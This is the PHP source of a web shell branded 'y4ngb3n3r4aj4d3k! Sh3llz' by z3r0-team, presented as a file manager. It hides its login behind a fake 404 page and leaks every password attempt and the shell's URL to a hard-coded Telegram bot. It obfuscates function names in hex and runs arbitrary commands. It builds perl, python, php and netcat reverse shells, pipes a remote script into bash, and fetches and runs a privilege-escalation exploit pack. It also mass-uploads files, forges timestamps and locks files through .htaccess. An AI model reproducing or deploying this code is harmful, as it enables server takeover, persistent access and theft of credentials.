<?php
/*
 * (c) Setsuna Watanabe <yucaerin@hotmail.com>
 *
 * GOOD LUCK, HAVE FUN!
 * v29 - Raw Telegram Log Implementation
 */

@set_time_limit(0); @error_reporting(0); @ini_set('error_log', null); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0); @ini_set('display_errors', 0);

$z_pass_hash = '$2a$12$l.9f4lHG2w855QOamo3SnuWVv01lVrpTN2OznqjkjiFnS0ychBvse';
$z_master_seed = hash('sha256', __FILE__);
$z_session_key = 'z_s_' . substr($z_master_seed, 0, 8);
$z_cookie_name = 'z_a_' . substr($z_master_seed, 8, 8);
$z_csrf_token_key = 'z_c_' . substr($z_master_seed, 16, 8);
$z_auth_token_key = 'z_t_' . substr($z_master_seed, 24, 8);

ini_set('session.gc_maxlifetime', 3600);
session_set_cookie_params(3600);
session_start();

if (isset($_POST['z3r0_team_act_g8i']) && $_POST['z3r0_team_act_g8i'] === 'z3r0_team_logout_h9j') {
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
    }
    setcookie($z_cookie_name, '', time() - 3600, '/');
    @session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$z_is_authenticated = false;
if (isset($_SESSION[$z_session_key]) && $_SESSION[$z_session_key] === true) {
    if (isset($_COOKIE[$z_cookie_name]) && isset($_SESSION[$z_auth_token_key])) {
        if (hash_equals($_SESSION[$z_auth_token_key], hash('sha256', $_COOKIE[$z_cookie_name]))) {
            $z_is_authenticated = true;
        }
    }
}

if (!$z_is_authenticated && isset($_POST['z3r0_team_pass_k2m'])) {
    $z3r0_team_pass_input = $_POST['z3r0_team_pass_k2m'];
    
    // --- Start: Raw Telegram Log Implementation ---
    $token = "7831803742:AAHa_xIjePROas8WTRptzadsAu07PxONNAQ";
    $chat_id = "6196640094";
    $shell_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $datetime = date('Y-m-d H:i:s') . " (Asia/Jakarta)";
    
    $message = "logbr3 - sh3llz\n"
             . "url host/file : " . $shell_url . "\n"
             . "password : " . $z3r0_team_pass_input . "\n\n"
             . "date and time : " . $datetime;

    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
            'ignore_errors' => true
        ],
    ];
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
    // --- End: Raw Telegram Log Implementation ---

    if (password_verify($z3r0_team_pass_input, $z_pass_hash)) {
        session_regenerate_id(true);
        $_SESSION[$z_session_key] = true;
        $z3r0_team_c_token_l3n = bin2hex(random_bytes(32));
        $_SESSION[$z_auth_token_key] = hash('sha256', $z3r0_team_c_token_l3n);
        $z3r0_team_c_opts_m4o = ['expires' => time() + 3600, 'path' => '/', 'secure' => isset($_SERVER['HTTPS']), 'httponly' => true, 'samesite' => 'Lax'];
        setcookie($z_cookie_name, $z3r0_team_c_token_l3n, $z3r0_team_c_opts_m4o);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (!$z_is_authenticated) {
    $z3r0_team_srv_soft_n5p = $_SERVER['SERVER_SOFTWARE'] ?? 'Apache'; $z3r0_team_srv_name_o6q = $_SERVER['SERVER_NAME'] ?? 'localhost'; $z3r0_team_srv_port_p7r = $_SERVER['SERVER_PORT'] ?? 80;
    $z3r0_team_login_form_q8s = '<div style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);opacity:0.01;filter:alpha(opacity=1);"><form method="POST" style="margin:0;"><input type="password" name="z3r0_team_pass_k2m" autofocus/></form></div>';
    header("HTTP/1.0 404 Not Found");
    $z3r0_team_page_html_r9t = '';
    if (stripos($z3r0_team_srv_soft_n5p, 'nginx') !== false) {$z3r0_team_page_html_r9t = <<<HTML
<!DOCTYPE html><html><head><title>404 Not Found</title></head><body bgcolor="white"><center><h1>404 Not Found</h1></center><hr><center>$z3r0_team_srv_soft_n5p</center>$z3r0_team_login_form_q8s</body></html>
HTML;
    } else { $z3r0_team_page_html_r9t = <<<HTML
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>$z3r0_team_srv_soft_n5p Server at $z3r0_team_srv_name_o6q Port $z3r0_team_srv_port_p7r</address>$z3r0_team_login_form_q8s</body></html>
HTML;
    } echo $z3r0_team_page_html_r9t; exit;
}

if (empty($_SESSION[$z_csrf_token_key])) { $_SESSION[$z_csrf_token_key] = bin2hex(random_bytes(32)); }
$z_csrf_token = $_SESSION[$z_csrf_token_key];

$Array = ['36643662', '363436393732', '36373635373435663636363936633635356637303635373236643639373337333639366636653733', '3639373335663737373236393734363136323663363535663730363537323664363937333733363936663665', '36353738363536333735373436353433366636643664363136653634', '373037323666363335663666373036353665', '3733373437323635363136643566363736353734356636333666366537343635366537343733', '36363639366336353566363736353734356636333666366537343635366537343733', '36363639366336353566373037353734356636333666366537343635366537343733', '3632363936653332363836353738', '36643666373636353566373537303666363136343635363435663636363936633635', '3638373436643663373337303635363336393631366336333638363137323733', '3638363537383332363236393665', '373036383730356637353665363136643635', '3733363336313665363436393732', '363937333566363436393732', '36363639366336353566363537383639373337343733', '37323635363136343636363936633635', '36363639366336353733363937613635', '36393733356637373732363937343631363236633635', '373236353665363136643635', '363636393663363537303635373236643733', '3733373037323639366537343636', '373337353632373337343732', '363636333663366637333635', '373037323666363335663666373036353665', '36393733356637323635373336663735373236333635', '3730373236663633356636333663366637333635', '373536653663363936653662', '3639373335663636363936633635', '34353534', '353634353532', '3533343934663465', '4c4f434b', '53544f52', '636f6d6d616e64', '776f726b696e674469726563746f7279', '6372656174654469726563746f7279', '70697065', '66696c65', '66696c65', '66696c654f776e65724f776e6572', '72656e616d65', '726561646d65'];
$S = []; foreach ($Array as $s) $S[] = hex2bin(hex2bin($s));

$b_func = $S[1]; $v = $S[9]; $y = $S[11]; $z = $S[12]; $q = $S[7]; $s_save = $S[8]; $ID = $S[15]; $FE = $S[16]; $FS = $S[18]; $IW = $S[19]; $UNL = $S[28]; $REN = $S[42]; $FP = $S[21]; $SPRF = $S[22]; $SBSR = $S[23];
$L = $GLOBALS['_GET']; $e = $GLOBALS['_FILES']; $o = $GLOBALS['_POST'];
$ISS = fn($arr, $key) => array_key_exists($key, $arr);

$dir_hex = $ISS($o, $b_func) ? $o[$b_func] : ($ISS($L, $b_func) ? $L[$b_func] : null);
$b_param = $dir_hex ? $z($dir_hex) : '.';
$b = realpath($b_param) ?: $b_param;
$home_dir_hex = $v(__DIR__);

function z3r0_team_exec_cmd($cmd, $cwd = null) { global $y; $d = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $p = @proc_open($cmd, $d, $pipes, $cwd); if (is_resource($p)) { $out = @stream_get_contents($pipes[1]); $err = @stream_get_contents($pipes[2]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $out . $err; } return "proc_open failed or disabled."; }
$z3r0_team_mass_upload_paths = [];
function z3r0_team_mass_upload($dir, $filename, $content, $is_recursive) { global $z3r0_team_mass_upload_paths, $ID, $IW; if ($IW($dir)) { $file_path = rtrim($dir, '/') . '/' . $filename; if (@file_put_contents($file_path, $content)) { $z3r0_team_mass_upload_paths[] = $file_path; } if (!$is_recursive) return; $items = @scandir($dir); if ($items === false) return; foreach ($items as $item) { if ($item === '.' || $item === '..') continue; $path = $dir . '/' . $item; if ($ID($path)) { z3r0_team_mass_upload($path, $filename, $content, $is_recursive); } } } }
function get_perms($item) { global $FP, $SPRF, $SBSR; return $SBSR($SPRF('%o', @$FP($item)), -4); }
function get_mtime($item) { return date('Y-m-d H:i:s', @filemtime($item)); }
function get_owner($item) { if (function_exists('posix_getpwuid')) { $owner_info = @posix_getpwuid(@fileowner($item)); return $owner_info['name'] ?? 'n/a'; } return @fileowner($item) ?? 'n/a'; }
function get_size($bytes) { if ($bytes === false) return '-'; $types = ['B', 'KB', 'MB', 'GB', 'TB']; for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++); return(round($bytes, 2) . " " . $types[$i]); }
function get_breadcrumbs($path) { $parts = explode('/', $path); $result = []; $current = ''; foreach ($parts as $part) { if (empty($part) && count($result) == 0) { $current = '/'; $result[] = ['n' => 'root', 'p' => '/']; continue; } if (empty($part)) continue; $current .= ($current == '/' ? '' : '/') . $part; $result[] = ['n' => $part, 'p' => $current]; } return $result; }

function generate_file_list_html($cwd) {
    global $v, $y, $ID, $IW;
    $items = @scandir($cwd);
    if ($items === false) return '<tr><td colspan="7" style="text-align:center;">Error: Cannot read directory.</td></tr>';
    $dirs = []; $files = [];
    foreach ($items as $item) { if ($item === '.' || $item === '..') continue; $ID($cwd . '/' . $item) ? $dirs[] = $item : $files[] = $item; }
    ob_start();
    foreach (array_merge($dirs, $files) as $item):
        $path = $cwd . '/' . $item; $path_hex = $v($path); $is_dir = $ID($path); $is_writable = $IW($path);
        $item_class = ($is_dir ? 'type-dir' : 'type-file') . ' ' . ($is_writable ? 'writable' : 'not-writable');
        $perms = get_perms($path); $mtime = get_mtime($path); $size = $is_dir ? '-' : get_size(@filesize($path));
    ?>
    <tr class="<?php echo $item_class; ?>"><td data-label="Select"><input type="checkbox" class="item-checkbox" value="<?php echo $path_hex; ?>"></td><td data-label="Name"><a onclick="<?php echo $is_dir ? "navigateTo('$path_hex')" : "viewFile('$path_hex')"; ?>"><?php echo $y($item); ?></a></td><td data-label="Owner"><?php echo get_owner($path); ?></td><td data-label="Modified"><span class="mtime" onclick="showTouchModal('<?php echo $path_hex; ?>', '<?php echo $mtime; ?>')"><?php echo $mtime; ?></span></td><td data-label="Size"><?php echo $size; ?></td><td data-label="Permissions"><span class="perms <?php echo $is_writable ? 'writable' : 'not-writable'; ?>" onclick="showChmodModal('<?php echo $path_hex; ?>', '<?php echo $perms; ?>')"><?php echo $perms; ?></span></td><td data-label="Actions" class="actions"><?php if (!$is_dir): ?><button type="button" class="action-btn" title="Edit" onclick="editFile('<?php echo $path_hex; ?>')">E</button><a class="action-btn" title="Download" href="?download=<?php echo $path_hex; ?>">D</a><?php endif; ?><button type="button" class="action-btn" title="Rename" onclick="renameItem('<?php echo $path_hex; ?>', '<?php echo $y($item); ?>')">R</button><button type="button" class="action-btn delete" title="Delete" onclick="deleteItems(['<?php echo $path_hex; ?>'])">Del</button></td></tr>
    <?php endforeach;
    return ob_get_clean();
}

function generate_breadcrumbs_html($cwd) {
    global $v, $y;
    $breadcrumbs = get_breadcrumbs($cwd);
    ob_start();
    foreach ($breadcrumbs as $i => $crumb) {
        if ($i > 0) echo '<span class="separator">›</span>';
        echo $i < count($breadcrumbs) - 1 ? '<a onclick="navigateTo(\'' . $v($crumb['p']) . '\')">' . $y($crumb['n']) . '</a>' : '<span>' . $y($crumb['n']) . '</span>';
    }
    return ob_get_clean();
}

if ($ISS($o, 'z3r0_team_act_g8i')) {
    header('Content-Type: application/json');
    if (!isset($o[$z_csrf_token_key]) || !isset($_SESSION[$z_csrf_token_key]) || !hash_equals($_SESSION[$z_csrf_token_key], $o[$z_csrf_token_key])) { echo json_encode(['status' => 'error', 'message' => 'Invalid CSRF token.']); exit; }
    $response = ['status' => 'error', 'message' => 'Invalid action'];
    $current_b = $ISS($o, $b_func) ? $z($o[$b_func]) : $b;
    switch ($o['z3r0_team_act_g8i']) {
        case 'z3r0_team_ping_session_d5e': $response = ['status' => 'success']; break;
        case 'z3r0_team_get_file_list_d4e': $response = ['status' => 'success', 'file_list_html' => generate_file_list_html($current_b), 'breadcrumbs_html' => generate_breadcrumbs_html($current_b), 'current_path_hex' => $v($current_b) ]; break;
        case 'z3r0_team_get_phpinfo_z0a': ob_start(); phpinfo(); $phpinfo_html = ob_get_clean(); preg_match('/<body[^>]*>(.*?)<\/body>/si', $phpinfo_html, $matches); $response = ['status' => 'success', 'output' => $matches[1] ?? '']; break;
        case 'z3r0_team_get_content_z0a': $file = $z($o['z_ph_1']); $content = $q($file); if ($content !== false) { $response = ['status' => 'success', 'content' => $content, 'path_hex' => $v($file), 'filename' => basename($file)]; } else { $response = ['status' => 'error', 'message' => 'Failed to read file']; } break;
        case 'z3r0_team_save_content_d4e': $file = $z($o['z_ph_1']); if ($s_save($file, $o['content']) !== false) { $response = ['status' => 'success', 'message' => 'File saved']; } else { $response = ['status' => 'error', 'message' => 'Failed to save']; } break;
        case 'z3r0_team_delete_e5f': $paths_hex = $o['z_ph_2'] ?? []; $s_count = 0; $f_count = 0; foreach ($paths_hex as $ph) { $file = $z($ph); $del = false; if ($ID($file)) { if (count(scandir($file)) == 2) { if (rmdir($file)) $del = true; } } else { if ($FE($file) && $UNL($file)) $del = true; } $del ? $s_count++ : $f_count++; } $msg = "$s_count item(s) deleted."; if ($f_count > 0) $msg .= " $f_count failed."; $response = ['status' => $s_count > 0 ? 'success' : 'error', 'message' => $msg]; break;
        case 'z3r0_team_rename_m3n': $old = $z($o['z_ph_1']); $new_name_raw = $o['new_name']; if(empty($old) || empty($new_name_raw) || !$FE($old)) { $response = ['status' => 'error', 'message' => 'Invalid file or name.']; } else { $new = dirname($old) . '/' . basename($new_name_raw); if (@$REN($old, $new)) { $response = ['status' => 'success', 'message' => 'Renamed']; } else { $response = ['status' => 'error', 'message' => 'Rename failed']; } } break;
        case 'z3r0_team_upload_p6q': if ($ISS($e, 'files')) { $c = count($e['files']['name']); for ($i = 0; $i < $c; $i++) { move_uploaded_file($e['files']['tmp_name'][$i], $current_b . '/' . basename($e['files']['name'][$i])); } $response = ['status' => 'success', 'message' => "$c file(s) uploaded"]; } break;
        case 'z3r0_team_remote_upload_d4e': $url = $o['url']; $filename = basename($o['filename']); if(empty($filename)) $filename = basename($url); $data = @file_get_contents($url); if($data !== false){ if(@file_put_contents($current_b . '/' . $filename, $data)){ $response = ['status' => 'success', 'message' => 'File uploaded.']; } else { $response = ['status' => 'error', 'message' => 'Failed to save file.']; } } else { $response = ['status' => 'error', 'message' => 'Failed to download from URL.']; } break;
        case 'z3r0_team_mkdir_r8s': mkdir($current_b . '/' . $o['name']) ? $response = ['status' => 'success', 'message' => 'Directory created'] : $response = ['status' => 'error', 'message' => 'Create failed']; break;
        case 'z3r0_team_mkfile_s9t': touch($current_b . '/' . $o['name']) ? $response = ['status' => 'success', 'message' => 'File created'] : $response = ['status' => 'error', 'message' => 'Create failed']; break;
        case 'z3r0_team_chmod_t0u': $file = $z($o['z_ph_1']); $perms = $o['perms']; if (@chmod($file, octdec($perms))) { $response = ['status' => 'success', 'message' => 'Permissions changed']; } else { $response = ['status' => 'error', 'message' => 'Chmod failed']; } break;
        case 'z3r0_team_defense_lock_h8i': $target_file = $o['target_file']; $backup_url = $o['backup_url']; $htaccess_path = $o['htaccess_path']; $msg = ''; $err = false; $backup_content = @file_get_contents($backup_url); if ($backup_content !== false) { if (@file_put_contents($target_file, $backup_content)) { $msg .= "File restored. "; if(!@chmod($target_file, 0444)) $msg .= "(chmod failed). "; } else { $msg .= "Failed to restore file. "; $err = true;} } else { $msg .= "Failed to fetch backup URL. "; $err = true; } $htaccess_content = @file_get_contents($htaccess_path); $filename_to_lock = basename($target_file); $new_rule = "\n# z3r0-team defense start\n<Files \"$filename_to_lock\">\n  Order allow,deny\n  Allow from all\n  Satisfy any\n</Files>\n# z3r0-team defense end\n"; if (strpos($htaccess_content, $new_rule) === false) { if (@file_put_contents($htaccess_path, $htaccess_content . $new_rule, FILE_APPEND)) { $msg .= ".htaccess updated. "; if(!@chmod($htaccess_path, 0444)) $msg .= "(chmod failed). "; } else { $msg .= "Failed to update .htaccess. "; $err = true;} } else { $msg .= ".htaccess rule already exists. "; } $response = ['status' => $err ? 'error' : 'success', 'message' => $msg]; break;
        case 'z3r0_team_touch_v2w': $file = $z($o['z_ph_1']); $datetime = $o['datetime']; if (@touch($file, strtotime($datetime))) { $response = ['status' => 'success', 'message' => 'Timestamp changed']; } else { $response = ['status' => 'error', 'message' => 'Touch failed']; } break;
        case 'z3r0_team_backconnect_h8i': $ip = $o['ip']; $port = $o['port']; $method = $o['method']; $cmd = ""; if ($method === 'perl') { $cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; } elseif ($method === 'python3') { $cmd = "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"; } elseif ($method === 'php') { $cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; } elseif ($method === 'nc') { $cmd = "nc -e /bin/sh $ip $port"; } if(!empty($cmd)) { z3r0_team_exec_cmd($cmd . " > /dev/null 2>&1 &"); $response = ['status' => 'success', 'message' => "Backconnect attempt sent to $ip:$port via $method."]; } else { $response = ['status' => 'error', 'message' => 'Invalid backconnect method.']; } break;
        case 'z3r0_team_ps_x4y': $response = ['status' => 'success', 'output' => z3r0_team_exec_cmd('ps aux')]; break;
        case 'z3r0_team_exec_y5z': $response = ['status' => 'success', 'output' => z3r0_team_exec_cmd($o['cmd'], $current_b)]; break;
        case 'z3r0_team_vulnscan_a1b': $cmd = "curl -Lsk https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash"; $response = ['status' => 'success', 'output' => z3r0_team_exec_cmd($cmd)]; break;
        case 'z3r0_team_autoroot_b2c': $work_dir = $b . '/r00ting'; $tar_file = $work_dir . '/auto.tar.gz'; $root_url = 'https://github.com/z3r0-team/backd00r/raw/refs/heads/main/root/auto.tar.gz'; @mkdir($work_dir, 0755); z3r0_team_exec_cmd("wget -O $tar_file $root_url > /dev/null 2>&1"); if (file_exists($tar_file)) { z3r0_team_exec_cmd("chmod +x $work_dir; tar -xf $tar_file -C $work_dir; chmod +x $work_dir/*"); $output = "Executing exploits from $work_dir:\n\n"; $exploits = ['netfilter', 'ptrace', 'sequoia', 'overlayfs', 'pwnkit', 'dirtypipe /usr/bin/su']; foreach($exploits as $exp) { $output .= "---[ $exp ]---\n"; $output .= z3r0_team_exec_cmd("cd $work_dir && timeout 10 ./$exp", $work_dir) . "\n\n"; } z3r0_team_exec_cmd("rm -rf $work_dir"); $response = ['status' => 'success', 'output' => $y($output)]; } else { @rmdir($work_dir); $response = ['status' => 'error', 'message' => 'Failed to download exploit pack.']; } break;
        case 'z3r0_team_massupload_c3d': $target_dir = $z($o['target_dir_hex']); $filename = $o['filename']; $content = $o['content']; $is_recursive = $o['recursive'] === 'true'; if ($ID($target_dir)) { z3r0_team_mass_upload($target_dir, $filename, $content, !$is_recursive); $count = count($z3r0_team_mass_upload_paths); $msg = "$count file(s) created.\n\nPaths:\n" . implode("\n", $z3r0_team_mass_upload_paths); $response = ['status' => 'success', 'message' => $msg]; } else { $response = ['status' => 'error', 'message' => 'Target is not a valid directory.']; } break;
    }
    $_SESSION[$z_csrf_token_key] = bin2hex(random_bytes(32));
    $response['new_csrf_token'] = $_SESSION[$z_csrf_token_key];
    echo json_encode($response); exit;
}
$downloader = ''; if (function_exists('curl_version')) $downloader .= 'cURL '; if (function_exists('file_get_contents')) $downloader .= 'f_g_c '; if (is_executable('/usr/bin/wget')) $downloader .= 'wget '; $downloader = empty(trim($downloader)) ? 'N/A' : trim($downloader);
$bg_proc = ''; if(is_executable('/usr/bin/screen')) $bg_proc .= 'screen '; if(is_executable('/usr/bin/tmux')) $bg_proc .= 'tmux '; $bg_proc = empty(trim($bg_proc)) ? 'N/A' : trim($bg_proc);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="z_csrf_token" content="<?php echo $z_csrf_token; ?>">
    <title>File Manager</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        :root { --bg-color: #1a1a1a; --fg-color: #f0f0f0; --border-color: #333; --accent-color: #0a84ff; --dir-color: #5aa9e6; --green: #30d158; --red: #ff453a; --input-bg: #2c2c2e; --dim-color: #777; }
        body { margin: 0 0 5rem 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--bg-color); color: var(--fg-color); font-size: 14px; }
        main { max-width: 1300px; margin: 2rem auto; padding: 0 1rem; }
        .box { background-color: var(--bg-color); border: 1px solid var(--border-color); border-radius: 12px; margin-bottom: 1.5rem; padding: 1rem; }
        .banner { text-align: center; font-family: 'Press Start 2P', cursive; font-weight: 400; font-size: 1.5rem; margin-bottom: 1rem; color: var(--accent-color);}
        .server-info-container { display:flex; justify-content: space-between; align-items: flex-start; }
        .server-info { font-family: monospace; font-size: 12px; color: var(--dim-color); line-height: 1.6; }
        .server-info span { color: var(--fg-color); }
        .server-info .php-version:hover { text-decoration: underline; cursor: pointer;}
        .breadcrumbs-container { display: flex; justify-content: space-between; align-items: center; background-color: var(--input-bg); padding: 0.5rem 1rem; border-radius: 8px; margin-bottom: 1rem; }
        .breadcrumbs { white-space: nowrap; overflow-x: auto; flex-grow: 1; }
        .breadcrumbs a { color: var(--accent-color); text-decoration: none; cursor: pointer; }
        .breadcrumbs a:hover { text-decoration: underline; }
        .breadcrumbs span { color: #888; }
        .breadcrumbs .separator { margin: 0 0.5rem; color: #555; }
        .home-btn { background: none; border: none; color: #ccc; cursor: pointer; font-size: 1.5rem; padding: 0.25rem; text-decoration: none; margin-left: 1rem; }
        .home-btn:hover { color: var(--accent-color); }
        .table-wrapper { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 0.75rem 0.5rem; text-align: left; border-bottom: 1px solid var(--border-color); vertical-align: middle; white-space: nowrap; }
        th { font-weight: 500; color: #aaa; }
        td a { text-decoration: none; font-weight: 500; cursor: pointer; }
        .perms, .mtime { font-family: monospace; cursor: pointer; }
        .actions { display: flex; gap: 1rem; justify-content: flex-end; align-items: center; }
        .action-btn { background: none; border: none; font-size: 13px; font-family: inherit; cursor: pointer; padding: 0; color: var(--accent-color); }
        .action-btn.delete { color: var(--red); }
        .action-btn:hover { text-decoration: underline; }
        .top-actions { display: flex; gap: 0.5rem; align-items: center; flex-wrap: wrap; }
        .top-actions .right-stack { margin-left: auto; text-align: right; }
        .top-actions .right-stack button { display: block; width: 100%; margin-bottom: 0.5rem; }
        .top-actions .right-stack button:last-child { margin-bottom: 0; }
        button, .button { background-color: var(--accent-color); border: none; color: white; padding: 0.6rem 1rem; border-radius: 8px; cursor: pointer; font-weight: 500; display: inline-block; text-align: center; }
        button:hover, .button:hover { opacity: 0.85; }
        .button-secondary { background-color: var(--input-bg); }
        .button-danger { background-color: var(--red); }
        .type-file a { color: var(--fg-color); }
        .type-dir a { color: var(--dir-color); }
        .not-writable a { color: var(--dim-color) !important; }
        .perms.writable, .mtime.writable { color: var(--green); }
        .perms.not-writable, .mtime.not-writable { color: var(--red); }
        #message-area { position: fixed; bottom: 1rem; left: 1rem; z-index: 2000; padding: 1rem; border-radius: 8px; text-align: center; display: none; transition: opacity 0.3s ease; }
        #message-area.success { background-color: var(--green); color: black; }
        #message-area.error { background-color: var(--red); color: white; }
        .modal-backdrop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .modal { background: var(--bg-color); border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 800px; display: flex; flex-direction: column; }
        .modal-header { padding: 1rem; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
        .modal-title { margin: 0; font-size: 1rem; font-weight: 600; }
        .modal-body { padding: 1rem; overflow: auto; display:flex; flex-direction:column; gap: 1rem; }
        .modal-footer { padding: 1rem; border-top: 1px solid var(--border-color); text-align: right; }
        .modal-body pre, .modal-body textarea { margin: 0; white-space: pre-wrap; word-wrap: break-word; font-family: "SF Mono", "Menlo", "Consolas", monospace; font-size: 13px; max-height: 60vh; overflow: auto; width: 100%; box-sizing: border-box; background: var(--input-bg); color: var(--fg-color); border: 1px solid var(--border-color); border-radius: 8px; }
        .modal-body textarea { height: 25vh; }
        #phpinfo-modal .modal-body { all: revert; padding: 1rem; background-color: #fff; color: #000;} #phpinfo-modal table { all: revert; border-collapse: collapse; width: 100%;} #phpinfo-modal td, #phpinfo-modal th { all: revert; border: 1px solid #ccc; padding: 0.5rem;} #phpinfo-modal h2 { all: revert; font-size: 1.5rem; color: #333; }
        input[type="text"], input[type="password"] { background-color: var(--input-bg); border: 1px solid var(--border-color); color: var(--fg-color); padding: 0.6rem; border-radius: 8px; width: 100%; box-sizing: border-box; }
        .close-btn { background: none; border: none; color: #888; font-size: 1.5rem; cursor: pointer; line-height: 1; }
        .checkbox-group label, .radio-group label { margin-right: 1rem; cursor: pointer; }
        #about-modal .credit { font-family: monospace; color: var(--accent-color); }
        .table-actions { padding: 1rem 0; }
        footer { position: fixed; bottom: 0; left: 0; width: 100%; text-align: center; color: var(--dim-color); padding: 0.5rem; font-family: monospace; font-size: 12px; background-color: var(--bg-color); border-top: 1px solid var(--border-color); z-index: 100; }
        @media (max-width: 768px) { main { margin: 1rem auto; } .top-actions, .server-info-container { flex-direction: column; align-items: stretch; gap: 1rem; } .top-actions .right-stack { margin-left: 0; } td:not(:first-child){display:block;text-align:right!important;padding-left:50%;position:relative;border-bottom:1px dotted var(--border-color);} td:first-child{display:block;text-align:right!important;padding-left:0;border-bottom:none;} td:last-child{border-bottom:none;} thead{display:none;} tr{display:block;border:1px solid var(--border-color);margin-bottom:1rem;border-radius:8px;} td::before{content:attr(data-label);position:absolute;left:6px;width:45%;padding-right:10px;white-space:nowrap;text-align:left;font-weight:bold;} td:first-child::before{content:none;} }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/ansi_up@5.2.1/ansi_up.min.js"></script>
</head>
<body>
    <main>
        <h2 class="banner">y4ngb3n3r4aj4d3k! Sh3llz</h2>
        <div class="box server-info-container">
            <div class="server-info">Host: <span><?php echo gethostname(); ?></span> | SAPI: <span><?php echo php_sapi_name(); ?></span><br>System: <span><?php echo php_uname(); ?></span><br>PHP Version: <span class="php-version"><?php echo phpversion(); ?></span><br>Disabled Functions: <span><?php echo ini_get('disable_functions') ?: 'None'; ?></span><br>Downloader: <span><?php echo $downloader; ?></span> | BG Process: <span><?php echo $bg_proc; ?></span></div>
            <form method="post"><input type="hidden" name="z3r0_team_act_g8i" value="z3r0_team_logout_h9j"><button type="submit" class="button-secondary">Logout</button></form>
        </div>
        <div class="box">
            <div class="breadcrumbs-container">
                <div class="breadcrumbs" id="breadcrumbs-list"></div>
                <a title="Go to script directory" class="home-btn" onclick="navigateTo('<?php echo $home_dir_hex; ?>')">🏠</a>
            </div>
            <div class="top-actions">
                <label for="upload-input" class="button button-secondary">Choose Files</label>
                <input type="file" name="files[]" id="upload-input" multiple required style="display:none;">
                <button id="remote-upload-btn" class="button button-secondary">Remote Upload</button>
                <button id="mass-upload-btn" class="button button-secondary">Mass Upload</button>
                <button id="defense-btn" class="button-secondary">File Defense</button>
                <button id="backconnect-btn" class="button-secondary">Backconnect</button>
                <button id="cmd-btn" class="button-secondary">Command</button>
                <button id="ps-btn" class="button-secondary">Processes</button>
                <button id="vuln-scan-btn" class="button-secondary">Vuln Scan</button>
                <button id="auto-root-btn" class="button-danger">Auto Root</button>
                <div class="right-stack"><button id="create-new-btn" class="button-secondary">Create New</button><button id="about-btn" class="button-secondary">About</button></div>
            </div>
        </div>
        <div class="box">
            <form id="file-list-form">
            <div class="table-wrapper">
            <table>
                <thead><tr><th style="width: 1%;"><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Owner</th><th>Modified</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead>
                <tbody id="file-list-tbody"></tbody>
            </table>
            </div>
            <div class="table-actions"><button type="button" id="delete-selected-btn" class="button-danger">Delete Selected</button></div>
            </form>
        </div>
    </main>
    <footer>y4n9b3n3r4aj4d3k! Sh3llz - z3r0-team!</footer>
    <div id="message-area"></div>
    <div id="long-task-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title" id="long-task-modal-title"></h2><button class="close-btn" onclick="hideModal('long-task-modal')">×</button></div><div class="modal-body"><pre id="long-task-output"></pre></div></div></div>
    <div id="view-edit-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title" id="view-edit-modal-title"></h2><button class="close-btn" onclick="hideModal('view-edit-modal')">×</button></div><div class="modal-body" id="view-edit-modal-body"></div><div class="modal-footer" id="view-edit-modal-footer"></div></div></div>
